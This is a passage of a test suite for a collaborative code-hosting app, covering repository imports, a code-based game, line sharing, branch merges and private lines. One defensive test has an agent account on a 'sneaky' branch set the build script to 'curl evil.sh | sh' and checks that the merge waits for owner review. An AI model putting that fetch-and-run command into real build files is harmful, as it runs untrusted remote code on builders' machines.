      expect((await post(call, null, "/api/github/dig", { repo: "ana-gh/Tiny.JS" })).status).toBe(401);
      expect((await post(call, "ana", "/api/github/dig", { repo: "not a repo" })).status).toBe(400);
      expect((await post(call, "ana", "/api/github/dig", { repo: "ana-gh/nope" })).status).toBe(404);
      const dug = await post(call, "ana", "/api/github/dig", { repo: "https://github.com/ana-gh/Tiny.JS.git" });
      expect(dug.status).toBe(201);
      expect(await dug.json()).toEqual({ owner: "ana", name: "tiny-js", upstream: "github:ana-gh/Tiny.JS", commit: "a".repeat(40) });
      expect(imports[0].source).toEqual({ url: "https://github.com/ana-gh/Tiny.JS.git", branch: "trunk", depth: 1 });
      expect(imports[0].target.opts.readOnly).toBeUndefined();   // writable: it's ana's now
      const meta = await (await call("ana", "/api/repos/ana/tiny-js")).json() as any;
      expect([meta.upstream, meta.branch, meta.home, meta.canWrite]).toEqual(["github:ana-gh/Tiny.JS", "trunk", "local", true]);
      expect((await post(call, "ana", "/api/github/dig", { repo: "ana-gh/Tiny.JS" })).status).toBe(409);

      // Private: local git clones it with the token; the public import never sees one.
      expect(imports[0].source.token).toBeUndefined();
      expect((await post(call, "ana", "/api/github/dig", { repo: "ana-gh/secret" })).status).toBe(201);
      expect(imports[1].source).toEqual({ url: "https://github.com/ana-gh/secret.git", branch: "main", depth: 1, token: "t0k" });
      // Cloudflare Artifacts imports public repos only: say so instead of failing later.
      Object.defineProperty(call.artifacts, "privateImports", { value: false });
      expect((await (await call("ana", "/api/github/repos")).json() as any).privateOk).toBe(false);
      const edge = await post(call, "ana", "/api/github/dig", { repo: "ana-gh/secret", name: "secret-2" });
      expect([edge.status, ((await edge.json()) as any).error]).toEqual([422, expect.stringContaining("desktop app")]);
    } finally { globalThis.fetch = real; }
  });
});

describe("game", () => {
  test("a level's backrooms: folders are doors, files are walls, cached by commit", async () => {
    const call = await local();
    const ns = call.artifacts, { push } = await import("../src/git.ts");
    const made = await ns.create("level-mitt");
    await push(made.remote, made.token, { changes: { "README.md": "mitt\n\ttabbed\n", "src/index.ts": "export default 1\nexport function isRecord(x: unknown): x is Record<string, unknown> {\n\treturn typeof x === \"object\" && x !== null;\n}\n", "logo.png": "\u0000png" }, message: "upstream", author: "upstream" });
    const tip = (await (await ns.get("level-mitt")).log())[0]!.hash;
    await call.env.DB.prepare("INSERT INTO levels (slug, status, commit_hash) VALUES ('mitt', 'ready', ?)").bind(tip).run();

    const root = await (await call(null, "/api/game/l/mitt/walls")).json() as any;
    expect(root.doors).toEqual([{ name: "src", path: "src" }]);
    expect(root.files.map((f: any) => [f.name, f.lines])).toEqual([["logo.png", []], ["README.md", ["mitt", "  tabbed", ""]]]);
    const src = (await (await call(null, "/api/game/l/mitt/walls?path=src")).json() as any).files[0];
    expect(src.lines[0]).toBe("export default 1");
    // Its type guard is a noodle monster, sent with its line range.
    expect(src.noodles).toEqual([{ name: "isRecord", start: 2, end: 4, record: true, lines: ["export function isRecord(x: unknown): x is Record<string, unknown> {", "  return typeof x === \"object\" && x !== null;", "}"] }]);
    expect(root.files.every((f: any) => !f.noodles)).toBe(true);
    expect((await call(null, "/api/game/l/mitt/walls?path=nope")).status).toBe(404);
    expect((await call(null, "/api/game/l/clsx/walls")).status).toBe(409);       // not imported
    // A second visit reads D1, not Artifacts.
    expect((await call.env.DB.prepare("SELECT key FROM walls_cache ORDER BY key").all()).results.map((r: any) => r.key)).toEqual([`v2:${tip}:`, `v2:${tip}:src`]);
    // Private repos stay private in the game too.
    await post(call, "ana", "/api/repos", { name: "secret", visibility: "private" });
    expect((await call("bo", "/api/game/r/ana/secret")).status).toBe(404);
    expect((await call("ana", "/api/game/r/ana/secret")).status).toBe(200);
  });

  test("noodles: type guards, isRecord the biggest, with their line ranges", () => {
    const found = noodles([
      "import x from \"y\";",
      "export function isRecord(value: unknown): value is Record<string, unknown> {",
      "  if (typeof value !== \"object\") return false;",
      "  return value !== null;",
      "}",
      "const isFoo = (x: unknown): x is { a: string } =>",
      "  typeof x === \"object\" &&",
      "  x !== null;",
      "export const isBar = <T extends Record<string, unknown>>(x: T | null): x is T => x != null;",
      "function notAGuard(x: unknown): boolean { return true }",
      "function isObj(x: unknown): x is Foo | { b: 1 } {",
      "  return true;",
      "}",
    ].join("\n"));
    expect(found.map((n) => [n.name, n.start, n.end, n.record])).toEqual([["isRecord", 2, 5, true], ["isFoo", 6, 8, false], ["isBar", 9, 9, false], ["isObj", 11, 13, false]]);
    expect(found[1]!.lines).toEqual(["const isFoo = (x: unknown): x is { a: string } =>", "  typeof x === \"object\" &&", "  x !== null;"]);
  });

  test("the room on a level's page: lobby, start, relay, clubbing, round over", async () => {
    const call = await local();
    const join = async (user: string) => {
      const res = await call(user, "/api/game/l/mitt/ws", { headers: { upgrade: "websocket" } }) as any;
      expect(res.status).toBe(101);
      const ws = res.webSocket, got: any[] = [];
      ws.toBrowser = (d: string) => got.push(JSON.parse(d));
      for (const d of ws.queue.splice(0)) got.push(JSON.parse(d));
      const say = async (m: unknown) => { ws.onMessage(JSON.stringify(m)); await Bun.sleep(5); };
      return { got, say, last: (t: string) => got.filter((m) => m.t === t).at(-1) };
    };
    const ana = await join("ana"), bo = await join("bo");
    await Bun.sleep(5);
    expect(ana.last("lobby").players.map((p: any) => p.user)).toEqual(["ana", "bo"]);
    expect(await (await call(null, "/api/game/l/mitt")).json()).toEqual({ state: "waiting", players: ["ana", "bo"] });

    // Both ready: the round starts for both with one seed.
    await ana.say({ t: "ready" });
    expect(ana.last("start")).toBeUndefined();
    await bo.say({ t: "ready" });
    expect(ana.last("start").seed).toBe(bo.last("start").seed);

    const boId = bo.last("lobby").you;
    await ana.say({ t: "pos", p: [1, 0, 2], yaw: 0.5, room: "src", swing: true });
    expect(bo.last("pos")).toMatchObject({ user: "ana", p: [1, 0, 2], room: "src", swing: true });
    expect(ana.last("pos")).toBeUndefined();                                   // not echoed back
    await ana.say({ t: "hit", target: boId, dir: [1, 0] });
    expect(bo.last("clubbed")).toEqual({ t: "clubbed", by: "ana", dir: [1, 0] });

    await ana.say({ t: "dead", score: 700 });
    expect(ana.last("over")).toBeUndefined();                                  // bo is still up
    await bo.say({ t: "dead", score: 300 });
    expect(ana.last("over").players.map((p: any) => [p.user, p.score])).toEqual([["ana", 700], ["bo", 300]]);
    expect(ana.last("lobby").state).toBe("waiting");

    // Next round: ana goes out, bo's tab goes quiet. Start says why it can't, until bo counts as idle.
    await ana.say({ t: "start" });
    const seed = ana.last("start").seed;
    await ana.say({ t: "dead", score: 50 });
    await ana.say({ t: "start" });
    expect(ana.last("note").text).toContain("bo");
    expect(ana.last("start").seed).toBe(seed);
    const idle = GameRoom.IDLE_MS;
    GameRoom.IDLE_MS = -1;
    try { await ana.say({ t: "start" }); } finally { GameRoom.IDLE_MS = idle; }
    expect(ana.last("start").seed).not.toBe(seed);
    expect(bo.last("start").seed).toBe(ana.last("start").seed);
  });

  test("panic rooms: pick a mode, break pieces for everyone, walk in on the wreckage", async () => {
    const call = await local();
    const join = async (user: string) => {
      const ws = ((await call(user, "/api/game/r/ana/dig/ws", { headers: { upgrade: "websocket" } })) as any).webSocket, got: any[] = [];
      ws.toBrowser = (d: string) => got.push(JSON.parse(d));
      for (const d of ws.queue.splice(0)) got.push(JSON.parse(d));
      const say = async (m: unknown) => { ws.onMessage(JSON.stringify(m)); await Bun.sleep(5); };
      return { got, say, last: (t: string) => got.filter((m) => m.t === t).at(-1) };
    };
    await post(call, "ana", "/api/repos", { name: "dig" });
    const ana = await join("ana"), bo = await join("bo");
    expect(ana.last("lobby").mode).toBe("horde");

    // Removed needs a diff; with one, everyone sees it.
    await ana.say({ t: "mode", mode: "removed" });
    expect(ana.last("note").text).toContain("diff");
    await ana.say({ t: "mode", mode: "removed", diff: { path: "a.ts", from: 2, to: 5 } });
    expect(bo.last("lobby")).toMatchObject({ mode: "removed", diff: { path: "a.ts", from: 2, to: 5 } });
    await bo.say({ t: "mode", mode: "wreck" });
    await bo.say({ t: "start" });
    expect(ana.last("start")).toMatchObject({ mode: "wreck" });
    await ana.say({ t: "mode", mode: "horde" });
    expect(ana.last("note").text).toContain("between rounds");

    // A break goes to the others once, and stays broken for the round.
    await ana.say({ t: "break", id: "src|0|1" });
    await ana.say({ t: "break", id: "src|0|1" });
    expect(bo.got.filter((m) => m.t === "broke")).toEqual([{ t: "broke", id: "src|0|1", by: "ana" }]);
    expect(ana.last("broke")).toBeUndefined();
    const cy = await join("cy");
    expect(cy.last("lobby")).toMatchObject({ state: "playing", mode: "wreck", broken: ["src|0|1"] });

    // Next round starts clean, in the mode picked.
    for (const p of [ana, bo, cy]) await p.say({ t: "dead", score: 10 });
    expect(ana.last("lobby")).toMatchObject({ state: "waiting", mode: "wreck" });
    await ana.say({ t: "start" });
    const late = await join("di");
    expect(late.last("lobby").broken).toEqual([]);
  });
});

describe("shares", () => {
  test("share a few lines of a private repo: live, following the lines, nothing else leaks", async () => {
    const call = await local();
    await post(call, "ana", "/api/repos", { name: "vault", visibility: "private" });
    await post(call, "ana", "/api/repos/ana/vault/files", { path: "a.ts", content: "one\ntwo\nthree\nfour" });
    const made = await post(call, "ana", "/api/repos/ana/vault/shares", { path: "a.ts", from: 2, to: 3, note: "the good bit" });
    expect(made.status).toBe(201);
    const { id } = await made.json() as any;
    const look = async (who: string | null) => (await (await call(who, `/api/shares/${id}`)).json()) as any;
    expect((await look(null)).lines.map((l: any) => [l.n, l.text])).toEqual([[2, "two"], [3, "three"]]);
    expect((await call("bo", "/api/repos/ana/vault/do/file?path=a.ts")).status).toBe(404);     // the rest stays sealed
    expect((await post(call, "bo", "/api/repos/ana/vault/shares", { path: "a.ts", from: 1, to: 4 })).status).toBe(404);

    // Edits around and inside the range: it follows the lines.
    const doc = await (await call("ana", "/api/repos/ana/vault/do/file?path=a.ts")).json() as any;
    const two = doc.lines[1];
    await post(call, "ana", "/api/repos/ana/vault/do/ops?path=a.ts", { ops: [{ kind: "insert", after: null, text: "zero" }, { kind: "insert", after: two.id, text: "two and a half" }, { kind: "set", line: two.id, base: two.rev, text: "TWO" }] });
    expect((await look("bo")).lines.map((l: any) => [l.n, l.text])).toEqual([[3, "TWO"], [4, "two and a half"], [5, "three"]]);

    expect((await call("bo", `/api/shares/${id}`, { method: "DELETE" })).status).toBe(403);
    expect((await call("ana", `/api/shares/${id}`, { method: "DELETE" })).status).toBe(200);
    expect((await call(null, `/api/shares/${id}`)).status).toBe(404);
  });

  test("an agent works on a branch, and the owner reviews and merges it", async () => {
    const call = await local();
    await post(call, "ana", "/api/login", { name: "ana" });
    await post(call, "ana", "/api/repos", { name: "r" });
    await post(call, "ana", "/api/repos/ana/r/collaborators", { name: "agent-a" });
    await post(call, "ana", "/api/repos/ana/r/files", { path: "a.js", content: "one\ntwo\nthree" });
    expect((await post(call, "bo", "/api/repos/ana/r/branches", { name: "tidy" })).status).toBe(403);
    expect((await post(call, "agent-a", "/api/repos/ana/r/branches", { name: "tidy" })).status).toBe(201);
    const on = "/api/repos/ana/r/do", q = "?path=a.js&branch=tidy";
    const ops = (user: string, query: string, o: unknown[]) => post(call, user, `${on}/ops${query}`, { ops: o });

    // The branch's copy starts as main's, ids and revs included.
    expect((await (await call("agent-a", `${on}/file${q}`)).json() as Doc).lines.map((l) => l.id)).toEqual(["L1", "L2", "L3"]);
    expect((await ops("agent-a", q, [{ kind: "set", line: "L2", base: 2, text: "TWO" }, { kind: "insert", after: "L3", text: "four" }])).status).toBe(200);
    expect((await post(call, "agent-a", "/api/repos/ana/r/files", { path: "new.js", content: "fresh", branch: "tidy" })).status).toBe(201);
    // Main moves on meanwhile, on another line and on the same one.
    await ops("ana", "?path=a.js", [{ kind: "set", line: "L1", base: 1, text: "ONE" }, { kind: "set", line: "L3", base: 3, text: "3" }]);
    expect(text(await (await call("ana", "/api/repos/ana/r/do/file?path=a.js")).json() as Doc)).toBe("ONE\ntwo\n3");

    expect((await post(call, "ana", "/api/repos/ana/r/do/merge?path=a.js", {})).status).toBe(404);
    expect((await post(call, "ana", `${on}/commit${q}`, {})).status).toBe(400);
    const review = await (await call("ana", "/api/repos/ana/r/branches/tidy")).json() as any;
    expect(review.files.map((f: any) => [f.path, f.ops.length, f.conflicts.length])).toEqual([["a.js", 2, 0], ["new.js", 1, 0]]);
    expect((await post(call, "ana", "/api/repos/ana/r/branches/tidy/merge", {})).status).toBe(200);
    const main = await (await call("ana", "/api/repos/ana/r/do/file?path=a.js")).json() as Doc;
    expect(main.lines.map((l) => `${l.by}:${l.text}`)).toEqual(["ana:ONE", "agent-a:TWO", "ana:3", "agent-a:four"]);
    expect(text(await (await call("ana", "/api/repos/ana/r/do/file?path=new.js")).json() as Doc)).toBe("fresh");
    expect((await (await call("ana", "/api/repos/ana/r/branches")).json() as any[])[0]).toMatchObject({ name: "tidy", status: "merged", merged_by: "ana" });
    // A merged branch takes no more edits.
    expect((await ops("agent-a", q, [{ kind: "insert", after: null, text: "late" }])).status).toBe(404);
  });

  test("a merge with a conflict lands nothing until each line is settled", async () => {
    const call = await local();
    await post(call, "ana", "/api/login", { name: "ana" });
    await post(call, "ana", "/api/repos", { name: "r" });
    await post(call, "ana", "/api/repos/ana/r/files", { path: "a.js", content: "x\ny" });
    await post(call, "ana", "/api/repos/ana/r/files", { path: "b.js", content: "z" });
    await post(call, "ana", "/api/repos/ana/r/branches", { name: "b1" });
    const opsOn = (query: string, o: unknown[]) => post(call, "ana", `/api/repos/ana/r/do/ops${query}`, { ops: o });
    await opsOn("?path=a.js&branch=b1", [{ kind: "set", line: "L1", base: 1, text: "branch" }]);
    await opsOn("?path=b.js&branch=b1", [{ kind: "set", line: "L1", base: 1, text: "Z" }]);
    await opsOn("?path=a.js", [{ kind: "set", line: "L1", base: 1, text: "main" }]);

    const r = await post(call, "ana", "/api/repos/ana/r/branches/b1/merge", {});
    expect(r.status).toBe(409);
    expect((await r.json() as any).conflicts).toEqual([{ path: "a.js", conflicts: [{ line: "L1", base: "x", main: "main", branch: "branch" }] }]);
    // Not even the clean file landed.
    expect(text(await (await call("ana", "/api/repos/ana/r/do/file?path=b.js")).json() as Doc)).toBe("z");
    expect((await post(call, "ana", "/api/repos/ana/r/branches/b1/merge", { resolve: { "a.js": { L1: "branch" } } })).status).toBe(200);
    expect(text(await (await call("ana", "/api/repos/ana/r/do/file?path=a.js")).json() as Doc)).toBe("branch\ny");
    expect(text(await (await call("ana", "/api/repos/ana/r/do/file?path=b.js")).json() as Doc)).toBe("Z");
  });

  test("a merge that would leave code that doesn't build waits, and says why", async () => {
    const call = await local();
    await post(call, "ana", "/api/login", { name: "ana" });
    await post(call, "ana", "/api/repos", { name: "r" });
    await post(call, "ana", "/api/repos/ana/r/files", { path: "a.ts", content: "const x = 1;\nlog(x);" });
    await post(call, "ana", "/api/repos/ana/r/branches", { name: "b1" });
    const opsOn = (query: string, o: unknown[]) => post(call, "ana", `/api/repos/ana/r/do/ops${query}`, { ops: o });
    // Each side declares the same new name in a different place: each builds alone, merged it's declared twice.
    await opsOn("?path=a.ts&branch=b1", [{ kind: "insert", after: null, text: "const y = 2;" }]);
    await opsOn("?path=a.ts", [{ kind: "insert", after: "L2", text: "const y = 3;" }]);
    const review = await (await call("ana", "/api/repos/ana/r/branches/b1")).json() as any;
    expect(review.files[0].conflicts).toEqual([{ line: "lint:redeclared:y", base: "", main: null, branch: null, lint: "`y` is declared twice (line 4)" }]);
    const r = await post(call, "ana", "/api/repos/ana/r/branches/b1/merge", {});
    expect(r.status).toBe(409);
    expect((await r.json() as any).error).toBe("merged, it wouldn't build: a.ts: `y` is declared twice (line 4)");
    expect(text(await (await call("ana", "/api/repos/ana/r/do/file?path=a.ts")).json() as Doc)).toBe("const x = 1;\nlog(x);\nconst y = 3;");
    expect((await post(call, "ana", "/api/repos/ana/r/branches/b1/merge", { resolve: { "a.ts": { "lint:redeclared:y": "branch" } } })).status).toBe(200);
  });

  test("private lines in a public repo: the crew reads them, everyone else, git and search get them blank", async () => {
    const call = await local();
    await post(call, "ana", "/api/repos", { name: "pub" });
    await post(call, "ana", "/api/repos/ana/pub/collaborators", { name: "agent-a" });
    await post(call, "ana", "/api/repos/ana/pub/files", { path: "a.ts", content: "one\nkey = hunter2\nthree" });
    const on = "/api/repos/ana/pub/do", q = "?path=a.ts";
    const read = async (who: string | null, route = "file", query = q) => (await (await call(who, `${on}/${route}${query}`)).json()) as any;
    const mark = (who: string, lines: string[], private_ = true) => post(call, who, `${on}/private${q}`, { lines, private: private_ });

    expect((await mark("bo", ["L2"])).status).toBe(403);
    expect((await post(call, "ana", `${on}/private${q}&branch=x`, { lines: ["L2"], private: true })).status).toBe(404);
    expect((await mark("ana", ["L2"])).status).toBe(200);
    // Outside the crew: a placeholder, in its place.
    expect((await read("bo")).lines.map((l: any) => [l.id, l.text, !!l.private])).toEqual([["L1", "one", false], ["L2", "", true], ["L3", "three", false]]);
    expect((await read(null)).lines[1].text).toBe("");
    expect((await read("agent-a")).lines[1]).toMatchObject({ text: "key = hunter2", private: true });

    // Edited, it stays private, and blame and time travel don't give it away.
    await post(call, "ana", `${on}/ops${q}`, { ops: [{ kind: "set", line: "L2", base: 2, text: "key = hunter3" }] });
    expect((await read("ana")).lines[1]).toMatchObject({ text: "key = hunter3", private: true });
    expect(JSON.stringify([await read("bo", "log"), await read("bo", "at", q + "&rev=3")])).not.toContain("hunter");

    // Git and search get the blank line; the crew still reads the real one.
    expect((await post(call, "ana", `${on}/commit${q}`, { message: "c" })).status).toBe(200);
    const repo = await call.artifacts.get("ana--pub");
    expect(await (await repo.readFile({ ref: "main", path: "a.ts" }))!.text()).toBe("one\n\nthree\n");
    expect(await (await call("ana", "/api/search?q=hunter3")).json()).toEqual([]);
    expect((await (await call("ana", "/api/search?q=three")).json() as any[]).length).toBe(1);

    // Shares and playlists read it as their reader may.
    const { id } = await (await post(call, "ana", "/api/repos/ana/pub/shares", { path: "a.ts", from: 1, to: 3 })).json() as any;
    expect((await (await call(null, `/api/shares/${id}`)).json() as any).lines.map((l: any) => l.text)).toEqual(["one", "", "three"]);
    const pl = await (await post(call, "bo", "/api/playlists", { title: "mine" })).json() as any;
    await post(call, "bo", `/api/playlists/${pl.id}/tracks`, { owner: "ana", repo: "pub", path: "a.ts", from: 1, to: 3 });
    expect((await (await call("bo", `/api/playlists/${pl.id}`)).json() as any).tracks[0].lines.map((l: any) => l.text)).toEqual(["one", "", "three"]);

    // A branch's copy hides the same lines, and lines marked after it forked.
    await post(call, "agent-a", "/api/repos/ana/pub/branches", { name: "b" });
    await post(call, "agent-a", `${on}/ops${q}&branch=b`, { ops: [{ kind: "set", line: "L2", base: 4, text: "key = hunter4" }] });
    await mark("ana", ["L1"]);
    expect((await read("bo", "file", q + "&branch=b")).lines.map((l: any) => l.text)).toEqual(["", "", "three"]);
    const review = await (await call("bo", "/api/repos/ana/pub/branches/b")).json() as any;
    expect(JSON.stringify(review)).not.toContain("hunter");
    expect(JSON.stringify(await (await call("ana", "/api/repos/ana/pub/branches/b")).json())).toContain("hunter4");

    // Public again.
    await mark("ana", ["L1", "L2"], false);
    expect((await read("bo")).lines.map((l: any) => l.text)).toEqual(["one", "key = hunter3", "three"]);
  });

  test("a branch that changes build or deploy files says so, and a merge that would ship waits for the owner to read it", async () => {
    const call = await local();
    await post(call, "ana", "/api/login", { name: "ana" });
    await post(call, "ana", "/api/repos", { name: "r" });
    await post(call, "ana", "/api/repos/ana/r/collaborators", { name: "agent-a" });
    await post(call, "ana", "/api/repos/ana/r/files", { path: "package.json", content: '{\n  "scripts": { "build": "vite build" }\n}' });
    await post(call, "agent-a", "/api/repos/ana/r/branches", { name: "sneaky" });
    await post(call, "agent-a", "/api/repos/ana/r/do/ops?path=package.json&branch=sneaky", { ops: [{ kind: "set", line: "L2", base: 2, text: '  "scripts": { "build": "curl evil.sh | sh" }' }] });
    await post(call, "agent-a", "/api/repos/ana/r/files", { path: "src/a.js", content: "fine", branch: "sneaky" });

    const review = await (await call("ana", "/api/repos/ana/r/branches/sneaky")).json() as any;
    expect(review.deploys).toBe(false);
    expect(review.files.map((f: any) => [f.path, f.build])).toEqual([["package.json", true], ["src/a.js", false]]);
    expect(review.files[0].lines).toEqual(['-   "scripts": { "build": "vite build" }', '+   "scripts": { "build": "curl evil.sh | sh" }']);
    expect(review.files[1].lines).toBeUndefined();

    // Once the owner's commit to main ships, the merge needs build_ok.
    expect((await call("ana", "/api/repos/ana/r/deploy", { method: "PUT", body: JSON.stringify({ on_commit: true }) })).status).toBe(200);
    expect((await (await call("ana", "/api/repos/ana/r/branches/sneaky")).json() as any).deploys).toBe(true);
    const no = await post(call, "ana", "/api/repos/ana/r/branches/sneaky/merge", {});
    expect(no.status).toBe(409);
    expect((await no.json() as any).build).toEqual(["package.json"]);
    expect(text(await (await call("ana", "/api/repos/ana/r/do/file?path=package.json")).json() as Doc)).toContain("vite build");
    expect((await post(call, "ana", "/api/repos/ana/r/branches/sneaky/merge", { build_ok: true })).status).toBe(200);
    expect(text(await (await call("ana", "/api/repos/ana/r/do/file?path=package.json")).json() as Doc)).toContain("curl evil.sh");
  });

  test("build and deploy files are told apart from the rest", () => {
    for (const p of ["package.json", "web/package.json", "bun.lock", "pnpm-lock.yaml", "rustybuns.config.ts", "wrangler.jsonc", ".rustybuns/state.json", "alchemy.run.ts", "Dockerfile", "api/Dockerfile.prod", "build.ts", "vite.config.mjs", ".github/workflows/ci.yml", ".gitlab-ci.yml"]) expect([p, isBuildFile(p)]).toEqual([p, true]);
    for (const p of ["src/build.tsx", "README.md", "src/package.ts", "docs/wrangler.md", "test/vite.config.test.ts"]) expect([p, isBuildFile(p)]).toEqual([p, false]);
  });

  test("the owner flips a repo public or private", async () => {
    const call = await local();
    await post(call, "ana", "/api/repos", { name: "dig", visibility: "private" });
    const put = (who: string, v: string) => call(who, "/api/repos/ana/dig", { method: "PUT", body: JSON.stringify({ visibility: v }) });
    expect((await call("bo", "/api/repos/ana/dig")).status).toBe(404);
    expect((await put("bo", "public")).status).toBe(404);
    expect((await put("ana", "public")).status).toBe(200);
    expect((await call("bo", "/api/repos/ana/dig")).status).toBe(200);
  });
});
